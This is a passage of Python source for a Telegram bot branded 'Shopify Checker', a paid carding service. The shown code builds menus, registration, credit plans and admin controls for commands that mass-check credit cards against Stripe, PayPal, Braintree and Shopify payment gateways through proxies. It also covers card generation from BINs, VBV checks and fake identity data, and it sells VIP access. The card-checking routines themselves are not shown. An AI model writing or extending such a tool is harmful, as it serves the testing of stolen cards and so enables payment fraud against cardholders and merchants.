    MESSAGE_OWNERS[msg.id] = event.sender_id

# Callback handler for Register button
@client.on(events.CallbackQuery(data=b"register"))
async def register_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    # Skip check for admins
    if user_id in ADMIN_ID:
        await event.answer("✅ Admin access verified!", alert=True)
        return
    
    try:
        # Check group membership
        group_joined = False
        try:
            participant = await client.get_permissions(GROUP_ID, user_id)
            group_joined = participant is not None
        except Exception as e:
            print(f"Error checking group membership: {e}")
            group_joined = False
        
        # Check channel membership
        channel_joined = False
        try:
            participant = await client.get_permissions(CHANNEL_ID, user_id)
            channel_joined = participant is not None
        except Exception as e:
            print(f"Error checking channel membership: {e}")
            channel_joined = False
        
        # If both joined - show success
        if group_joined and channel_joined:
            # Give new user 100 credits if they don't have any
            user_data = await get_user_credits(user_id)
            if user_data.get('credits', 0) == 0 and user_data.get('plan', 'Free') == 'Free':
                await set_user_credits(user_id, 100, "Free")
                print(f"[REGISTRATION] New user {user_id} registered with 100 credits")
            
            success_text = "✅ 𝙍𝙚𝙜𝙞𝙨𝙩𝙧𝙖𝙩𝙞𝙤𝙣 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡!\n\n🎉 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙖𝙡𝙡 𝙗𝙤𝙩 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨!\n💰 You received 100 free credits!"
            await event.answer(success_text, alert=True)
        else:
            # User hasn't joined - edit message with join buttons
            register_text = "**Registration Required ⚠️**\n\n**Join both channels and group below to use the bot**"
            
            buttons = [
                [Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1"), Button.url("📢 Join Channel", "https://t.me/+Y2QWCIycJPplMDE1")],
                [Button.inline("Register Done ✅", b"verify_registration")]
            ]
            await event.edit(register_text, buttons=buttons)
    
    except Exception as e:
        print(f"Error in register_callback: {e}")
        await event.answer("⚠️ Error checking membership. Please try again!", alert=True)

# Callback handler for Register Done (Verify Registration)
@client.on(events.CallbackQuery(data=b"verify_registration"))
async def verify_registration_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    try:
        # Check group membership
        group_joined = False
        try:
            participant = await client.get_permissions(GROUP_ID, user_id)
            group_joined = participant is not None
        except:
            group_joined = False
        
        # Check channel membership
        channel_joined = False
        try:
            participant = await client.get_permissions(CHANNEL_ID, user_id)
            channel_joined = participant is not None
        except:
            channel_joined = False
        
        # If both joined - update to main menu
        if group_joined and channel_joined:
            # Give new user 100 credits if they don't have any
            user_data = await get_user_credits(user_id)
            if user_data.get('credits', 0) == 0 and user_data.get('plan', 'Free') == 'Free':
                await set_user_credits(user_id, 100, "Free")
                print(f"[REGISTRATION] New user {user_id} registered with 100 credits")
            
            # Get user info
            _, access_type = await can_use(user_id, event.chat)
            user = await event.get_sender()
            user_name = user.first_name if user.first_name else f"@{user.username}" if user.username else "User"
            
            # Build success message - Free and VIP only
            user_data = await get_user_credits(user_id)
            user_plan = user_data.get('plan', 'Free')
            
            if user_plan == "VIP":
                text = f"★ꜱʜᴏᴘɪꜰʏ ᴄʜᴇᴄᴋᴇʀ★```\nName: {user_name}\nUser ID: {user_id}\nRegistration: ✅ Success```\n💎 Status: VIP Access ({get_mtxt_cc_limit(access_type, user_id)} CCs)"
            else:
                text = f"★ꜱʜᴏᴘɪꜰʏ ᴄʜᴇᴄᴋᴇʀ★```\nName: {user_name}\nUser ID: {user_id}\nRegistration: ✅ Success```\n🆓 Status: Free User ({get_mtxt_cc_limit(access_type, user_id)} CCs)"
            
            buttons = [
                [Button.inline("Commands", b"commands"), Button.inline("Close", b"close")]
            ]
            
            await event.edit(text, buttons=buttons)
            await event.answer("✅ Registration Successful!", alert=False)
        else:
            # Still not joined
            missing = []
            if not group_joined:
                missing.append("Group")
            if not channel_joined:
                missing.append("Channel")
            
            await event.answer(f"❌ Please join: {', '.join(missing)}", alert=True)
    
    except Exception as e:
        print(f"Error in verify_registration_callback: {e}")
        await event.answer("⚠️ Error checking membership. Please try again!", alert=True)

# Callback handler for Commands button
@client.on(events.CallbackQuery(data=b"commands"))
async def commands_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    # Check membership manually
    if user_id not in ADMIN_ID:
        try:
            # Check group membership
            group_joined = False
            try:
                participant = await client.get_permissions(GROUP_ID, user_id)
                group_joined = participant is not None
            except:
                group_joined = False
            
            # Check channel membership
            channel_joined = False
            try:
                participant = await client.get_permissions(CHANNEL_ID, user_id)
                channel_joined = participant is not None
            except:
                channel_joined = False
            
            # If not both joined - show only missing join buttons
            if not (group_joined and channel_joined):
                register_text = "**Registration Required ⚠️**\n\n**Join both channels and group below to use the bot**"
                
                buttons = []
                # Only show buttons for missing channels
                if not group_joined and not channel_joined:
                    # Both missing
                    buttons.append([Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1"), Button.url("📢 Join Channel", "https://t.me/+Y2QWCIycJPplMDE1")])
                elif not group_joined:
                    # Only group missing
                    buttons.append([Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")])
                elif not channel_joined:
                    # Only channel missing
                    buttons.append([Button.url("📢 Join Channel", "https://t.me/+Y2QWCIycJPplMDE1")])
                
                buttons.append([Button.inline("Register Done ✅", b"verify_registration")])
                
                await event.edit(register_text, buttons=buttons)
                return
        except:
            pass
    
    # User is registered - show all gateway commands
    commands_text = """**Shopify (Proxy Gateway)**

/psh - Check single CC with proxy
/pmsh - Mass check multiple CCs with proxy
/ptxt - Mass check from text file with proxy

**Proxy Management:**
• /setpx <proxy> - Set your proxy
• /getpx - View current proxy
• /delpx - Delete proxy

**Site Management:**
• /txturl <sites> - Add sites for txt checking
• /txtls - List all your sites
• /txtrm <site/index> - Remove site"""
    
    buttons = [
        [Button.inline("Back", b"back")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

# Callback handler for Stripe Gateway commands
@client.on(events.CallbackQuery(data=b"stripe_cmds"))
async def stripe_cmds_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("Access Denied", alert=True)
                return
    
    # Get command status
    st_status = "✅" if COMMAND_STATES.get("st", True) else "🔴"
    mst_status = "✅" if COMMAND_STATES.get("mst", True) else "🔴"
    mstxt_status = "✅" if COMMAND_STATES.get("mstxt", True) else "🔴"
    
    commands_text = f"""**Stripe Auth Gateway**

{st_status} /st <card>
└ Check single CC via Stripe Auth

{mst_status} /mst <cards>
└ Mass check multiple CCs

{mstxt_status} /mstxt (reply to .txt)
└ Mass check from text file

**Format:** 4111111111111111|12|2025|123"""
    
    buttons = [
        [Button.inline("Back", b"auth_gates")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

# Callback handler for Shopify No Proxy commands
@client.on(events.CallbackQuery(data=b"shopify_noproxy_cmds"))
async def shopify_noproxy_cmds_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("Access Denied", alert=True)
                return
    
    # Get command status
    sh_status = "✅" if COMMAND_STATES.get("sh", True) else "🔴"
    msh_status = "✅" if COMMAND_STATES.get("msh", True) else "🔴"
    mtxt_status = "✅" if COMMAND_STATES.get("mtxt", True) else "🔴"
    
    commands_text = f"""**Shopify Self**

{sh_status} /sh <card>
└ Check single CC on your sites

{msh_status} /msh <cards>
└ Mass check multiple CCs

{mtxt_status} /mtxt (reply to .txt)
 └ __(Premium user only)__🔥
 └ Mass check from text file

**Note:** Add sites first using /add <site>

**Site Management:**
• /add - Add Shopify sites
• /sites - View your sites
• /check - Refresh your sites"""
    
    buttons = [
        [Button.inline("Back", b"charge_gates")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

# Callback handler for Shopify With Proxy commands
@client.on(events.CallbackQuery(data=b"shopify_proxy_cmds"))
async def shopify_proxy_cmds_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("Access Denied", alert=True)
                return
    
    # Get command status
    psh_status = "✅" if COMMAND_STATES.get("psh", True) else "🔴"
    pmsh_status = "✅" if COMMAND_STATES.get("pmsh", True) else "🔴"
    ptxt_status = "✅" if COMMAND_STATES.get("ptxt", True) else "🔴"
    
    commands_text = f"""**Shopify (Proxy Gateway)**

{psh_status} /psh <card>
└ Check single CC with proxy

{pmsh_status} /pmsh <cards>
└ Mass check multiple CCs with proxy

{ptxt_status} /ptxt (reply to .txt)
└ Mass check from text file with proxy

**Proxy Management:**
• /setpx <proxy> - Set your proxy
• /getpx - View current proxy
• /delpx - Delete proxy

**Site Management:**
• /txturl <sites> - Add sites for txt checking
• /txtls - List all your sites
• /txtrm <site/index> - Remove site

**Proxy Format:** ip:port:user:pass
**Example:** 192.168.1.1:8080:user:pass"""
    
    buttons = [
        [Button.inline("Back", b"charge_gates")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

# Callback handler for Tools & Management commands
@client.on(events.CallbackQuery(data=b"tools_cmds"))
async def tools_cmds_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("Access Denied", alert=True)
                return
    
    commands_text = """**Tools & Bot Management**

**User Tools:**
• /info - Get your user information
• /balance - Check credit balance
• /myplan - Check plan details
• /redeem <key> - Redeem key
• /bin <bin> - Check BIN information

**File Tools:**
• /fl - Extract & format cards from file/text
• /spl <number> - Split file into multiple files

**Card Generator:**
• /gen - Generate cards from BIN
• /bin - Check BIN info
• /vbv - Check VBV status

**Other:**
• /fake - Generate fake data"""
    
    buttons = [
        [Button.inline("Back", b"back")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

# Callback handler for Command Control (Admin only)
@client.on(events.CallbackQuery(data=b"cmd_control"))
async def cmd_control_callback(event):
    user_id = event.sender_id
    
    # Only admins can access
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    # Build organized command control menu
    status_text = "**Command Control Panel**\n\nSelect category to manage:"
    
    buttons = [
        [Button.inline("Stripe Auth", b"ctrl_stripe"), Button.inline("PayPal Auth", b"ctrl_paypal")],
        [Button.inline("Braintree Auth", b"ctrl_braintree")],
        [Button.inline("Shopify (No Proxy)", b"ctrl_shopify_noproxy"), Button.inline("Shopify (With Proxy)", b"ctrl_shopify_proxy")],
        [Button.inline("Tools & Others", b"ctrl_tools")],
        [Button.inline("Back", b"gateways")]
    ]
    
    await event.edit(status_text, buttons=buttons)

# Control handlers for each category
@client.on(events.CallbackQuery(data=b"ctrl_braintree"))
async def ctrl_braintree_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    commands = ["bt"]
    buttons = []
    
    for cmd in commands:
        enabled = COMMAND_STATES.get(cmd, True)
        emoji = "✅" if enabled else "🔴"
        on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{cmd}_on".encode())
        off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{cmd}_off".encode())
        buttons.append([Button.inline(f"{emoji} /{cmd}", b"noop"), on_button, off_button])
    
    buttons.append([Button.inline("« Back", b"cmd_control")])
    await event.edit("**Braintree Auth Commands**\n\nToggle commands:", buttons=buttons)

@client.on(events.CallbackQuery(data=b"ctrl_stripe"))
async def ctrl_stripe_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    stripe_cmds = ["st", "mst", "mstxt"]
    status_text = "**Stripe Commands Control**\n\n"
    
    buttons = []
    for cmd in stripe_cmds:
        enabled = COMMAND_STATES.get(cmd, True)
        emoji = "✅" if enabled else "🔴"
        status = "ON" if enabled else "OFF"
        status_text += f"{emoji} /{cmd} - {status}\n"
        
        # Add ON/OFF buttons in same row
        on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{cmd}_on".encode())
        off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{cmd}_off".encode())
        buttons.append([on_button, off_button])
    
    buttons.append([Button.inline("« Back", b"cmd_control")])
    await event.edit(status_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"ctrl_paypal"))
async def ctrl_paypal_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    paypal_cmds = ["pp", "mpp"]
    status_text = "**PayPal Auth Commands Control**\n\n"
    
    buttons = []
    for cmd in paypal_cmds:
        enabled = COMMAND_STATES.get(cmd, True)
        emoji = "✅" if enabled else "🔴"
        status = "ON" if enabled else "OFF"
        status_text += f"{emoji} /{cmd} - {status}\n"
        
        # Add ON/OFF buttons in same row
        on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{cmd}_on".encode())
        off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{cmd}_off".encode())
        buttons.append([on_button, off_button])
    
    buttons.append([Button.inline("« Back", b"cmd_control")])
    await event.edit(status_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"ctrl_shopify_noproxy"))
async def ctrl_shopify_noproxy_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    shopify_cmds = ["sh", "msh", "mtxt", "lol"]
    status_text = "**Shopify (No Proxy) Control**\n\n"
    
    buttons = []
    for cmd in shopify_cmds:
        enabled = COMMAND_STATES.get(cmd, True)
        emoji = "✅" if enabled else "🔴"
        status = "ON" if enabled else "OFF"
        status_text += f"{emoji} /{cmd} - {status}\n"
        
        # Add ON/OFF buttons in same row
        on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{cmd}_on".encode())
        off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{cmd}_off".encode())
        buttons.append([on_button, off_button])
    
    buttons.append([Button.inline("« Back", b"cmd_control")])
    await event.edit(status_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"ctrl_shopify_proxy"))
async def ctrl_shopify_proxy_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    proxy_cmds = ["psh", "pmsh", "ptxt"]
    status_text = "**Shopify (With Proxy) Control**\n\n"
    
    buttons = []
    for cmd in proxy_cmds:
        enabled = COMMAND_STATES.get(cmd, True)
        emoji = "✅" if enabled else "🔴"
        status = "ON" if enabled else "OFF"
        status_text += f"{emoji} /{cmd} - {status}\n"
        
        # Add ON/OFF buttons in same row
        on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{cmd}_on".encode())
        off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{cmd}_off".encode())
        buttons.append([on_button, off_button])
    
    buttons.append([Button.inline("« Back", b"cmd_control")])
    await event.edit(status_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"ctrl_tools"))
async def ctrl_tools_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("Admin Only", alert=True)
        return
    
    tool_cmds = ["gen", "bin", "check", "fl", "fake", "info", "sites"]
    status_text = "**Tools & Others Control**\n\n"
    
    buttons = []
    for cmd in tool_cmds:
        enabled = COMMAND_STATES.get(cmd, True)
        emoji = "✅" if enabled else "🔴"
        status = "ON" if enabled else "OFF"
        status_text += f"{emoji} /{cmd} - {status}\n"
        
        # Add ON/OFF buttons in same row
        on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{cmd}_on".encode())
        off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{cmd}_off".encode())
        buttons.append([on_button, off_button])
    
    buttons.append([Button.inline("« Back", b"cmd_control")])
    await event.edit(status_text, buttons=buttons)

# Callback handler for toggling commands
@client.on(events.CallbackQuery(pattern=b"toggle_(.+)"))
async def toggle_command_callback(event):
    user_id = event.sender_id
    
    # Only admins can toggle
    if user_id not in ADMIN_ID:
        await event.answer("⚠️ Admin Only", alert=True)
        return
    
    # Extract command name and action from callback data
    data = event.data.decode().replace("toggle_", "")
    
    # Check if it's _on or _off action
    if data.endswith("_on"):
        cmd = data.replace("_on", "")
        new_state = True
    elif data.endswith("_off"):
        cmd = data.replace("_off", "")
        new_state = False
    else:
        # Old toggle format (for backward compatibility)
        cmd = data
        new_state = not COMMAND_STATES.get(cmd, True)
    
    if cmd not in COMMAND_STATES:
        await event.answer("❌ Unknown command", alert=True)
        return
    
    # Set the command state
    COMMAND_STATES[cmd] = new_state
    await save_command_states()
    
    # Show notification
    status = "enabled" if COMMAND_STATES[cmd] else "disabled"
    await event.answer(f"✅ /{cmd} {status}!", alert=False)
    
    # Refresh the appropriate control panel
    shopify_cmds = ["sh", "msh", "mtxt", "lol"]
    proxy_cmds = ["psh", "pmsh", "ptxt"]
    
    if cmd in shopify_cmds:
        # Refresh Shopify (No Proxy) panel
        status_text = "**Shopify (No Proxy) Control**\n\n"
        buttons = []
        for command in shopify_cmds:
            enabled = COMMAND_STATES.get(command, True)
            emoji = "✅" if enabled else "🔴"
            status_display = "ON" if enabled else "OFF"
            status_text += f"{emoji} /{command} - {status_display}\n"
            
            on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{command}_on".encode())
            off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{command}_off".encode())
            buttons.append([on_button, off_button])
        
        buttons.append([Button.inline("« Back", b"cmd_control")])
    elif cmd in proxy_cmds:
        # Refresh Shopify (With Proxy) panel
        status_text = "**Shopify (With Proxy) Control**\n\n"
        buttons = []
        for command in proxy_cmds:
            enabled = COMMAND_STATES.get(command, True)
            emoji = "✅" if enabled else "🔴"
            status_display = "ON" if enabled else "OFF"
            status_text += f"{emoji} /{command} - {status_display}\n"
            
            on_button = Button.inline("ON" if not enabled else "✅ ON", f"toggle_{command}_on".encode())
            off_button = Button.inline("OFF" if enabled else "🔴 OFF", f"toggle_{command}_off".encode())
            buttons.append([on_button, off_button])
        
        buttons.append([Button.inline("« Back", b"cmd_control")])
    else:
        return  # Unknown command group
    
    try:
        await event.edit(status_text, buttons=buttons)
    except Exception:
        pass  # Ignore if message content is same

# Callback handler for Sites button
@client.on(events.CallbackQuery(data=b"show_sites"))
async def show_sites_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    
    if user_sites:
        sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else:
        sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"
    
    sites_msg = f"""🌐 𝙔𝙤𝙪𝙧 𝙎𝙞𝙩𝙚𝙨 ({len(user_sites)}):

```
{sites_text}
```
"""
    
    # Check message length and truncate if too long
    if len(sites_msg) > 4000:
        max_sites_to_show = 1000
        if len(user_sites) > max_sites_to_show:
            sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites[:max_sites_to_show])])
            sites_text += f"\n... and {len(user_sites) - max_sites_to_show} more sites"
            
            sites_msg = f"""🌐 𝙔𝙤𝙪𝙧 𝙎𝙞𝙩𝙚𝙨 ({len(user_sites)}):

```
{sites_text}
```
"""
    
    back_button = [[Button.inline("🔙 Back to Commands", b"commands")]]
    await event.edit(sites_msg, buttons=back_button)

# Callback handler for Back button
@client.on(events.CallbackQuery(data=b"back"))
async def back_callback(event):
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    _, access_type = await can_use(user_id, event.chat)
    
    # Get user info
    user = await event.get_sender()
    user_name = user.first_name if user.first_name else f"@{user.username}" if user.username else "User"
    
    # Get user credits and plan
    user_data = await get_user_credits(user_id)
    credits = user_data.get('credits', 0)
    plan = user_data.get('plan', 'Free')
    
    # Check registration status
    registration_status = "❌ Not Registered"
    if user_id in ADMIN_ID:
        registration_status = "✅ Success"
    else:
        try:
            group_joined = False
            try:
                participant = await client.get_permissions(GROUP_ID, user_id)
                group_joined = participant is not None
            except:
                group_joined = False
            
            channel_joined = False
            try:
                participant = await client.get_permissions(CHANNEL_ID, user_id)
                channel_joined = participant is not None
            except:
                channel_joined = False
            
            if group_joined and channel_joined:
                registration_status = "✅ Success"
        except:
            pass
    
    # Build message with credits
    plan_emoji = "💎" if plan == "VIP" else "🆓"
    text = f"★ꜱʜᴏᴘɪꜰʏ ᴄʜᴇᴄᴋᴇʀ★```\nName: {user_name}\nUser ID: {user_id}\nRegistration: {registration_status}```\n**Plan:** {plan} {plan_emoji} | **Credits:** {credits} 💰"
    
    # Dynamic buttons
    if registration_status == "✅ Success":
        buttons = [
            [Button.inline("Commands", b"commands"), Button.inline("Tools", b"tools_cmds")],
            [Button.inline("Gates", b"gateways")],
            [Button.inline("Plans", b"plans_info"), Button.inline("Close", b"close")]
        ]
    else:
        buttons = [
            [Button.inline("Register", b"register")],
            [Button.inline("Commands", b"commands"), Button.inline("Tools", b"tools_cmds")],
            [Button.inline("Gates", b"gateways")],
            [Button.inline("Plans", b"plans_info")]
        ]
    
    await event.edit(text, buttons=buttons)

# Callback handler for Close button
@client.on(events.CallbackQuery(data=b"gateways"))
async def gateways_callback(event):
    """Show all gateway options"""
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    gateways_text = """**Gateway Categories**

Select a category:"""
    
    buttons = [
        [Button.inline("Auth Gates", b"auth_gates"), Button.inline("Charge Gates", b"charge_gates")]
    ]
    
    # Add Command Control for admin
    if user_id in ADMIN_ID:
        buttons.append([Button.inline("Command Control", b"cmd_control")])
    
    buttons.append([Button.inline("Back", b"back")])
    
    await event.edit(gateways_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"auth_gates"))
async def auth_gates_callback(event):
    """Show Auth gateway options"""
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    auth_text = """**Auth Gates**

Select an auth gateway:"""
    
    buttons = [
        [Button.inline("Stripe Auth", b"stripe_cmds"), Button.inline("PayPal Auth", b"paypal_cmds")],
        [Button.inline("Braintree Auth", b"braintree_cmds")],
        [Button.inline("Back", b"gateways")]
    ]
    
    await event.edit(auth_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"charge_gates"))
async def charge_gates_callback(event):
    """Show Charge gateway options"""
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    charge_text = """**Charge Gates**

Select a charge gateway:"""
    
    buttons = [
        [Button.inline("Shopify Self", b"shopify_noproxy_cmds"), Button.inline("Shopify Proxy", b"shopify_proxy_cmds")],
        [Button.inline("Back", b"gateways")]
    ]
    
    await event.edit(charge_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"braintree_cmds"))
async def braintree_cmds_callback(event):
    """Show Braintree commands"""
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("Access Denied", alert=True)
                return
    
    # Get command status
    bt_status = "✅" if COMMAND_STATES.get("bt", True) else "🔴"
    
    commands_text = f"""**Braintree Auth Gateway**

{bt_status} /bt <card>
└ Check single CC via Braintree Auth"""
    
    buttons = [
        [Button.inline("Back", b"auth_gates")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"paypal_cmds"))
async def paypal_cmds_callback(event):
    """Show PayPal commands"""
    user_id = event.sender_id
    
    # Restrict button clicks to message owner only (skip for admins)
    if user_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != user_id:
                await event.answer("Access Denied", alert=True)
                return
    
    # Get command status
    pp_status = "✅" if COMMAND_STATES.get("pp", True) else "🔴"
    mpp_status = "✅" if COMMAND_STATES.get("mpp", True) else "🔴"
    
    commands_text = f"""**PayPal Auth Gateway**

{pp_status} /pp <card>
└ Check single CC via PayPal Auth

{mpp_status} /mpp <cards>
└ Mass check multiple CCs

**Format:** 4111111111111111|12|2025|123"""
    
    buttons = [
        [Button.inline("Back", b"auth_gates")]
    ]
    
    await event.edit(commands_text, buttons=buttons)

@client.on(events.CallbackQuery(data=b"buy_credits"))
async def buy_credits_callback(event):
    """Show plan purchase options"""
    await event.answer(
        "💎 Available Plans\n"
        "━━━━━━━━━━━━━━━\n"
        "💎 VIP Plan\n"
        "• No Credits Required\n"
        "• Access to all premium features\n"
        "• Unlimited mass checks\n"
        "• 15 days validity\n"
        "• Dedicated support\n"
        "• Early access to new features\n"
        "━━━━━━━━━━━━━━━\n"
        "💡 How to Purchase:\n"
        "Contact 𝘼𝙆 to upgrade your plan!\n\n"
        "📊 Use /info to check your current plan",
        alert=True
    )

@client.on(events.CallbackQuery(data=b"myplan_btn"))
async def myplan_btn_callback(event):
    """Show plan details from button"""
    try:
        user_data = await get_user_credits(event.sender_id)
        credits = user_data.get('credits', 0)
        plan = user_data.get('plan', 'Free')
        total_used = user_data.get('total_used', 0)
        plan_set_date = user_data.get('plan_set_date')
        
        # Format plan set date
        date_text = "N/A"
        if plan_set_date:
            try:
                date_obj = datetime.datetime.fromisoformat(plan_set_date)
                date_text = date_obj.strftime("%d %b %Y, %I:%M %p")
            except:
                pass
        
        # Plan features
        if plan == "VIP":
            features = "✅ All CC check commands\n✅ /mtxt text file checking\n✅ 1 credit per CC"
            emoji = "💎"
        elif plan == "VIP":
            features = "✅ All CC check commands\n✅ /mtxt text file checking\n✅ 1 credit per CC"
            emoji = "👑"
        else:
            features = "✅ Basic CC check commands\n❌ /mtxt access (Premium/VIP only)\n✅ 1 credit per CC"
            emoji = "🆓"
        
        await event.answer(
            f"{emoji} Plan: {plan}\n"
            f"💰 Credits: {credits}\n"
            f"📈 Used: {total_used}\n"
            f"📅 Date: {date_text}\n\n"
            f"Use /myplan for full details",
            alert=True
        )
    except Exception as e:
        await event.answer(f"❌ Error: {e}", alert=True)

@client.on(events.CallbackQuery(data=b"plans_info"))
async def plans_info_callback(event):
    # Restrict button clicks to message owner only (skip for admins)
    if event.sender_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != event.sender_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    plans_text = """💎 **VIP Plan**
• No Credits Required 
• Access to all premium features
• Unlimited mass checks
• Dedicated support
• Early access to new features

**Price List 💰**
• 5 days / $5
• 10 days / $10
• 15 days / $15
━━━━━━━━━━━━━━━
💡 **How to Purchase:**
Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade your plan!

📊 Use /info to check your current plan"""
    
    buttons = [[Button.inline("Back", b"back")]]
    
    await event.edit(plans_text, buttons=buttons, link_preview=False)

@client.on(events.CallbackQuery(data=b"close"))
async def close_callback(event):
    # Restrict button clicks to message owner only (skip for admins)
    if event.sender_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != event.sender_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    try:
        await event.delete()
    except Exception as e:
        print(f"Error deleting message: {e}")
        await event.answer("✅ Closed!", alert=False)

# Callback handler for Self Shopify button
@require_membership
@client.on(events.CallbackQuery(data=b"self_shopify"))
async def self_shopify_callback(event):
    # Restrict button clicks to message owner only (skip for admins)
    if event.sender_id not in ADMIN_ID:
        if event.message_id in MESSAGE_OWNERS:
            if MESSAGE_OWNERS[event.message_id] != event.sender_id:
                await event.answer("⚠️ Access Denied", alert=True)
                return
    
    shopify_text = """Stripe Auth Gateway
/st or .st ⇾ Check CC via Stripe Auth.
/mst or .mst ⇾ Mass check CCs via Stripe.
/mstxt or .mstxt ⇾ Mass check from .txt via Stripe.

**Shopify Self**

